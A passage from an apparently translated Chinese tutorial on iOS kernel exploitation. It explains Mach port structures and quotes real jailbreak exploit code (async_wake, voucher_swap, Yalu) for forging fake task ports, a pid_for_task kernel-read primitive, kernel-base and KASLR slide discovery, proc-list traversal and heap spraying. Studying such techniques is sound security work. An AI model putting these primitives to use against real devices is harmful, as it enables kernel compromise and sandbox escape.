32</span></span><br><span class="line"><span class="number">125</span>: <span class="meta">#<span class="keyword">define</span> IKOT_AU_SESSIONPORT        33</span></span><br><span class="line"><span class="number">126</span>: <span class="meta">#<span class="keyword">define</span> IKOT_FILEPORT          34</span></span><br><span class="line"><span class="number">127</span>: <span class="meta">#<span class="keyword">define</span> IKOT_LABELH            35</span></span><br><span class="line"><span class="number">128</span>: <span class="meta">#<span class="keyword">define</span> IKOT_TASK_RESUME       36</span></span><br><span class="line"><span class="number">129</span>: <span class="meta">#<span class="keyword">define</span> IKOT_VOUCHER           37</span></span><br><span class="line"><span class="number">130</span>: <span class="meta">#<span class="keyword">define</span> IKOT_VOUCHER_ATTR_CONTROL  38</span></span><br><span class="line"><span class="number">131</span>: <span class="meta">#<span class="keyword">define</span> IKOT_WORK_INTERVAL              39</span></span><br><span class="line"><span class="number">132</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UX_HANDLER                 40</span></span><br><span class="line"><span class="number">133</span>: </span><br><span class="line"><span class="number">134</span>: <span class="comment">/*</span></span><br><span class="line"><span class="comment">135:  * Add new entries here and adjust IKOT_UNKNOWN.</span></span><br><span class="line"><span class="comment">136:  * Please keep ipc/ipc_object.c:ikot_print_array up to date.</span></span><br><span class="line"><span class="comment">137:  */</span></span><br><span class="line"><span class="number">138</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UNKNOWN                    41      <span class="comment">/* magic catchall       */</span></span></span><br><span class="line"><span class="number">139</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_MAX_TYPE   (IKOT_UNKNOWN+1)    <span class="comment">/* # of IKOT_ types */</span></span></span><br><span class="line"><span class="number">140</span>: </span><br><span class="line"><span class="number">141</span>: </span><br><span class="line"><span class="number">142</span>: <span class="meta">#<span class="keyword">define</span> is_ipc_kobject(ikot)   ((ikot) != IKOT_NONE)</span></span><br></pre></td></tr></table></figure>

<p>设置端口的io_bits示例代码如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IO_BITS_ACTIVE 0x80000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IKOT_TASK 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IKOT_CLOCK 25</span></span><br><span class="line"></span><br><span class="line">fakeport-&gt;io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;</span><br><span class="line">secondfakeport-&gt;io_bits = IKOT_TASK|IO_BITS_ACTIVE;</span><br></pre></td></tr></table></figure>

<p>ipc_object的io_references也需要被设置为不为0的值确保该对象不释放。</p>
<p>回到端口结构体，另一个重要成员是<code>struct ipc_space * receiver</code>，它指向ipc_space结构体。任务的ipc_space结构体定义其IPC功能。每个IPC功能都由一个ipc_entry表示，并放在一个表中，ipc_space结构体中的is_table指向该表。is_table中的端口权限或功能为16位，其名称实际上是is_table的索引。重要的是注意在内核中，端口权限(mach_port_t)通过传递指向适当的端口数据结构体(ipc_port_t)的指针来表示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> &#123;</span></span><br><span class="line">	<span class="type">lck_spin_t</span>	is_lock_data;</span><br><span class="line">	<span class="type">ipc_space_refs_t</span> is_bits;	<span class="comment">/* holds refs, active, growing */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_table_size;	<span class="comment">/* current size of table */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_table_free;	<span class="comment">/* count of free elements */</span></span><br><span class="line">	<span class="type">ipc_entry_t</span> is_table;		<span class="comment">/* an array of entries */</span></span><br><span class="line">	<span class="type">task_t</span> is_task;                 <span class="comment">/* associated task */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_table_size</span> *<span class="title">is_table_next</span>;</span> <span class="comment">/* info for larger table */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_low_mod;	<span class="comment">/* lowest modified entry during growth */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_high_mod;	<span class="comment">/* highest modified entry during growth */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bool_gen</span> <span class="title">bool_gen</span>;</span>       <span class="comment">/* state for boolean RNG */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> is_entropy[IS_ENTROPY_CNT]; <span class="comment">/* pool of entropy taken from RNG */</span></span><br><span class="line">	<span class="type">int</span> is_node_id;			<span class="comment">/* HOST_LOCAL_NODE, or remote node if proxy space */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>ipc_space是非常重要的结构体</strong>，因此，大多数EXP程序都会寻找内核ipc_space以便获得适当的(但仍为假的)内核任务端口。方法是将ipc_space_kernel复制到新的内存，并使假的端口的receiver指向该内存。</p>
<p>根据io_bits中设置的kobject类型，kobject指向不同的数据结构。因此如果伪造任务端口则需要将kobject指向struct task，如果是时钟，则指向struct clock。</p>
<p>async_wake EXP中相关的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span>* <span class="title function_">build_message_payload</span><span class="params">(<span class="type">uint64_t</span> dangling_port_address, <span class="type">uint32_t</span> message_body_size, <span class="type">uint32_t</span> message_body_offset, <span class="type">uint64_t</span> vm_map, <span class="type">uint64_t</span> receiver, <span class="type">uint64_t</span>** context_ptr)</span> &#123;</span><br><span class="line">  <span class="type">uint8_t</span>* body = <span class="built_in">malloc</span>(message_body_size);</span><br><span class="line">  <span class="built_in">memset</span>(body, <span class="number">0</span>, message_body_size);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> port_page_offset = dangling_port_address &amp; <span class="number">0xfff</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// structure required for the first fake port:</span></span><br><span class="line">  <span class="type">uint8_t</span>* fake_port = body + (port_page_offset - message_body_offset);</span><br><span class="line"></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;</span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = <span class="number">0xf00d</span>; <span class="comment">// leak references</span></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = <span class="number">0xf00d</span>; <span class="comment">// leak srights</span></span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;</span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = <span class="number">0x123456789abcdef</span>;</span><br><span class="line"></span><br><span class="line">  *context_ptr = (<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the kobject pointer such that task-&gt;bsd_info reads from ip_context:</span></span><br><span class="line">  <span class="type">int</span> fake_task_offset = koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT) - koffset(KSTRUCT_OFFSET_TASK_BSD_INFO);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> fake_task_address = dangling_port_address + fake_task_offset;</span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_address;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// when we looked for a port to make dangling we made sure it was correctly positioned on the page such that when we set the fake task</span></span><br><span class="line">  <span class="comment">// pointer up there it&#x27;s actually all in the buffer so we can also set the reference count to leak it, let&#x27;s double check that!</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fake_port + fake_task_offset &lt; body) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the maths is wrong somewhere, fake task doesn&#x27;t fit in message\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span>* fake_task = fake_port + fake_task_offset;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the ref_count field of the fake task:</span></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = <span class="number">0xd00d</span>; <span class="comment">// leak references</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// make sure the task is active</span></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the vm_map of the fake task:</span></span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the task lock type of the fake task&#x27;s lock:</span></span><br><span class="line">  *(<span class="type">uint8_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = <span class="number">0x22</span>;</span><br><span class="line">  <span class="keyword">return</span> body;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>拓展知识：<a target="_blank" rel="noopener" href="https://papers.put.as/papers/ios/2017/cansecwest2017stefanesserportaltotheioscore.pdf">CanSecWest 2017 - Port(al) to the iOS Core</a></p>
</blockquote>
<h3 id="pid-for-task-任意读取"><a href="#pid-for-task-任意读取" class="headerlink" title="pid_for_task()任意读取"></a>pid_for_task()任意读取</h3><p>如前所述，pid_for_task()将给出相应任务的PID。假设p_pid的偏移量为0x10，并且假设要读取的地址为addr，则可以创建一个伪造端口，然后将其关联到假的任务，使得该任务中的bsd_info为addr-0x10。</p>
<p>下面是voucher_swap EXP中相关的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stage1_read32</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *  Read a 32-bit value from kernel memory using our fake port.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  This primitive requires that we know the address of the pipe buffer containing our port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span></span><br><span class="line"><span class="title function_">stage1_read32</span><span class="params">(<span class="type">uint64_t</span> address)</span> &#123;</span><br><span class="line">  <span class="comment">// Do a read to make the pipe available for a write.</span></span><br><span class="line">  read_pipe();</span><br><span class="line">  <span class="comment">// Create our fake task. The task&#x27;s proc&#x27;s p_pid field overlaps with the address we want to</span></span><br><span class="line">  <span class="comment">// read.</span></span><br><span class="line">  <span class="type">uint64_t</span> fake_proc_address = address - OFFSET(proc, p_pid);</span><br><span class="line">  <span class="type">uint64_t</span> fake_task_address = pipe_buffer_address + fake_task_offset;</span><br><span class="line">  <span class="type">uint8_t</span> *fake_task = (<span class="type">uint8_t</span> *) pipe_buffer + fake_task_offset;</span><br><span class="line">  FIELD(fake_task, task, ref_count, <span class="type">uint64_t</span>) = <span class="number">2</span>;</span><br><span class="line">  FIELD(fake_task, task, bsd_info,  <span class="type">uint64_t</span>) = fake_proc_address;</span><br><span class="line">  <span class="comment">// Initialize the port as a fake task port pointing to our fake task.</span></span><br><span class="line">  <span class="type">uint8_t</span> *fake_port_data = (<span class="type">uint8_t</span> *) pipe_buffer + fake_port_offset;</span><br><span class="line">  FIELD(fake_port_data, ipc_port, ip_bits,    <span class="type">uint32_t</span>) = io_makebits(<span class="number">1</span>, IOT_PORT, IKOT_TASK);</span><br><span class="line">  FIELD(fake_port_data, ipc_port, ip_kobject, <span class="type">uint64_t</span>) = fake_task_address;</span><br><span class="line">  <span class="comment">// Write our buffer to kernel memory.</span></span><br><span class="line">  write_pipe();</span><br><span class="line">  <span class="comment">// Now use pid_for_task() to read our value.</span></span><br><span class="line">  <span class="type">int</span> pid = <span class="number">-1</span>;</span><br><span class="line">  <span class="type">kern_return_t</span> kr = pid_for_task(fake_port, &amp;pid);</span><br><span class="line">  <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">    ERROR(<span class="string">&quot;%s returned %d: %s&quot;</span>, <span class="string">&quot;pid_for_task&quot;</span>, kr, mach_error_string(kr));</span><br><span class="line">    ERROR(<span class="string">&quot;could not read kernel memory in stage %d using %s&quot;</span>, <span class="number">1</span>, <span class="string">&quot;pid_for_task&quot;</span>);</span><br><span class="line">    fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">uint32_t</span>) pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用两次就可以读取64bit：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stage1_read64</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *  Read a 64-bit value from kernel memory using our stage 1 read primitive.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span></span><br><span class="line"><span class="title function_">stage1_read64</span><span class="params">(<span class="type">uint64_t</span> address)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> value32[<span class="number">2</span>];</span><br><span class="line">    <span class="type">uint64_t</span> value64;</span><br><span class="line">  &#125; u;</span><br><span class="line">  u.value32[<span class="number">0</span>] = stage1_read32(address);</span><br><span class="line">  u.value32[<span class="number">1</span>] = stage1_read32(address + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> u.value64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意偏移量会随着iOS版本以及设备的不同而变化。这些偏移量既可以通过查看内核源代码来找到，也可以通过查看kernelcache文件来找到。</p>
<p>此技术非常强大，可一次读取4个字节的内核内存。还可以用该函数找到内核偏移。需要做的仅仅是每次向后读取四个字节的内核内存，直到获得魔术值0xfeedfacf为止。该地址是内核基地址，减去用IDA或Hopper打开kernelcache时的起始地址就得到了偏移量。</p>
<p>下面是Yalu EXP中相关的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int32_t</span> leaked = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// The offset from the start of &quot;struct task&quot; to &quot;task-&gt;bsd_info&quot; seems to be fixed to 0x360, but this is prone to change anytime in the future as apple sees fit</span></span><br><span class="line">        <span class="comment">// It&#x27;d be nice to use a heuristic method like how K33n Team does it with the cpu_clock thing</span></span><br><span class="line">        *(<span class="type">uint64_t</span>*) (faketask + procoff) = leaked_ptr - <span class="number">0x10</span>;</span><br><span class="line">        <span class="comment">// This tries to read a value from &quot;task-&gt;bsd_info-&gt;p_pid&quot; which translates to &quot;faketask-&gt;bsd_info-&gt;p_pid = (leaked_ptr - 0x10)-&gt;p_pid = leaked_ptr&quot;</span></span><br><span class="line">        pid_for_task(foundport, &amp;leaked);</span><br><span class="line">        <span class="comment">// Is it 0xfeedfacf?</span></span><br><span class="line">        <span class="keyword">if</span> (leaked == MH_MAGIC_64) &#123;</span><br><span class="line">            NSLog(@<span class="string">&quot;found kernel text at %llx&quot;</span>, leaked_ptr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Retreat one page and search again</span></span><br><span class="line">        leaked_ptr -= <span class="number">0x4000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// Found kernel base!</span></span><br><span class="line"><span class="type">uint64_t</span> kernel_base = leaked_ptr;</span><br><span class="line">.....................</span><br><span class="line">.....................</span><br><span class="line"><span class="comment">// Calculating KASLR slide</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint64_t</span> slide;</span><br><span class="line">slide = kernel_base - <span class="number">0xFFFFFFF007004000</span>;</span><br></pre></td></tr></table></figure>

<p>获得了内核基地址就可以在内核内存中找到一些重要的结构体，例如<code>extern struct proclist allproc;</code>。可以在<code>/bsd/sys/proc_internal.h</code>中找到它。即使存在KASLR，它相对内核基地址的偏移总是固定的。正如我们从内核代码中看到的那样，该结构体包含进程的列表。也可以使用<code>jtool2 –analyze</code>命令找到符号地址，因为Apple错误地发布了含有符号的kernelcache。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">lck_grp_attr_t</span> * proc_lck_grp_attr;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">lck_attr_t</span> * proc_lck_attr;</span><br><span class="line"></span><br><span class="line">LIST_HEAD(proclist, proc);</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">proclist</span> <span class="title">allproc</span>;</span>		<span class="comment">/* List of all processes. */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">proclist</span> <span class="title">zombproc</span>;</span>	<span class="comment">/* List of zombie processes. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">initproc</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span>	<span class="title function_">procinit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_lock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_unlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_spinlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_spinunlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_list_lock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_list_unlock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_klist_lock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_klist_unlock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdlock_spin</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdunlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdlock_assert</span><span class="params">(<span class="type">proc_t</span> p, <span class="type">int</span> assertflags)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_ucred_lock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_ucred_unlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br></pre></td></tr></table></figure>

<p>然后，可以再次使用pid_for_task()来遍历这些结构体，通过检查pid&#x3D;getpid()找到当前proc结构体(这样我们以后可以更改当前proc的cred以逃逸沙盒)，并通过检查pid&#x3D;0来找到内核proc结构体(这样我们就可以获得内核proc的cred，找到kernel task，ipc_space_kernel等)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// extern struct proclist allproc;</span></span><br><span class="line"><span class="comment">// This global variable stores the start of the linked_list of all proc objects</span></span><br><span class="line"><span class="type">uint64_t</span> allproc = allproc_offset + kernel_base;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> proc_ = allproc;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> myproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> kernproc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Traverse the linked list until the end of the list. I guess the next pointer of the last element is set to 0</span></span><br><span class="line"><span class="keyword">while</span> (proc_) &#123;</span><br><span class="line">    <span class="type">uint64_t</span> proc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getting the address of the next proc object in the linked list</span></span><br><span class="line">    *(<span class="type">uint64_t</span>*) (faketask + procoff) = proc_ - <span class="number">0x10</span>;</span><br><span class="line">    pid_for_task(foundport, (<span class="type">int32_t</span>*)&amp;proc);</span><br><span class="line">    <span class="comment">// Need to read 2 times cause &quot;pid_for_task&quot; can only read 4 bytes at a time</span></span><br><span class="line">    *(<span class="type">uint64_t</span>*) (faketask + procoff) = <span class="number">4</span> + proc_ - <span class="number">0x10</span>;</span><br><span class="line">    pid_for_task(foundport, (<span class="type">int32_t</span>*)(((<span class="type">uint64_t</span>)(&amp;proc)) + <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getting the PID of from proc-&gt;p_pid</span></span><br><span class="line">    <span class="type">int</span> pd = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*) (faketask + procoff) = proc;</span><br><span class="line">    pid_for_task(foundport, &amp;pd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Checking if it equals my PID</span></span><br><span class="line">    <span class="keyword">if</span> (pd == getpid()) &#123;</span><br><span class="line">        <span class="comment">// Address of my proc struct</span></span><br><span class="line">        myproc = proc;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pd == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// Address of the kernel proc struct</span></span><br><span class="line">        kernproc = proc;</span><br><span class="line">    &#125;</span><br><span class="line">    proc_ = proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="堆分配基础"><a href="#堆分配基础" class="headerlink" title="堆分配基础"></a>堆分配基础</h3><p>在iOS中，堆内存分为多个zone。相同大小的分配使用相同的zone，除非某些对象具有自己的特殊zone(ports，vouchers等)。这些zone随着分配对象增多而增长，并且从zone map中获得新页。在macOS上，可以使用zprint命令看到分配的zone。许多堆分配技术在iOS中仍然相同。另一件事是要注意，iOS也具有zone垃圾回收。</p>
<p><img src="https://highaltitudehacks.com/images/30.png" alt="30"></p>
<p>如上所述，某些对象具有自己的特殊zone。zone是固定大小的数据块的集合，可以对其进行快速分配和释放。例如，在下图中，我们可以看到很多IPC对象，包括ports，vouchers等都有自己的zone。因此如果释放一个voucher那么将无法使用另一种对象占用释放的内存，除非触发zone垃圾回收并将包含该地址的页移动到其它位置，然后再分配另一种对象。</p>
<p><img src="https://highaltitudehacks.com/images/31.png" alt="31"></p>
<p>在最近的几个iOS版本中对堆采取了很多加固措施。</p>
<blockquote>
<p>建议阅读这个Stefan Esser关于iOS内核堆的[PPT](<a target="_blank" rel="noopener" href="https://gsec.hitb.org/materials/sg2016/D2">https://gsec.hitb.org/materials/sg2016/D2</a> - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf)，也可以阅读内核源代码，从osfmk&#x2F;kern&#x2F;zalloc.c开始，其中有一些堆分配的注释。</p>
</blockquote>
<p><img src="https://highaltitudehacks.com/images/38.png" alt="38"></p>
<p>最近用于heap spray的常用技术之一是通过发送带有选项<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>的Mach消息，以端口指针数组填充内存。这将调用<code>ipc/ipc_kmsg.c</code>中的<code>ipc_kmsg_copyin_ool_ports_descriptor</code>，它会调用kalloc(ports_length)将端口指针填充到堆中。</p>
<p>在voucher_swap EXP中可以看到这样做的好处：虽然分配端口会将它们放入ipc.port zone，但是如果是端口指针，就不是这样，因此可以使用端口指针占用释放的对象。用端口其实也可以，因为进行足够的喷射之后能够迫使内核进行垃圾回收并从zone map中分配新页，其中可能包括释放的对象。</p>
